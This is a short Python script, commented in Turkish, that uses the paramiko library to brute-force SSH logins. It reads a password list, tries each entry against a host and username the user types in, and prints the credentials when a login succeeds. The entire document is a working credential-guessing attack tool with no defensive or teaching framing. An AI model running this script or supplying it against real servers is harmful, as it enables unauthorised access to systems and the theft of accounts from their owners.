import paramiko

def ssh_brute_force(host, kullanici_adi, sifre_listesi_dosyasi):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        with open(sifre_listesi_dosyasi, "r") as dosya:
            for sifre in dosya:
                sifre = sifre.strip()
                try:
                    ssh.connect(host, username=kullanici_adi, password=sifre)
                    print(f"Başarılı! Kullanıcı adı: {kullanici_adi}, Şifre: {sifre}")
                    ssh.close()
                    return True
                except paramiko.AuthenticationException:
                    print(f"Başarısız deneme: {sifre}")
                except Exception as e:
                    print(f"Hata oluştu: {e}")
                    return False
    except FileNotFoundError:
        print("Şifre listesi dosyası bulunamadı.")
        return False

    print("Brute force denemesi tamamlandı.")
    return False

# Kullanıcıdan girişler alalım
host = input("SSH sunucusu adresini girin: ")
kullanici_adi = input("Kullanıcı adını girin: ")
sifre_listesi_dosyasi = input("Şifre listesi dosyasının yolunu girin: ")

ssh_brute_force(host, kullanici_adi, sifre_listesi_dosyasi)
